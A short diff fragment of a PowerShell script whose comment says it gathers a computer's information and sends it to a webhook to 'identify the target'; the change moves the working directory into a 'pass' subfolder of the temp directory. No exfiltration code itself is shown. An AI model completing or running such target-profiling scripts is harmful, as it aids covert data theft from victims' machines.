@@ -1,7 +1,7 @@
 #This will grab just the computer Info and send it to a webhook so you can identify the target
 
 $D="$env:tmp";
-cd $D
+cd $D\pass;
 
 $FileName = "${Date}${env:computername}_${Time}.txt";
 
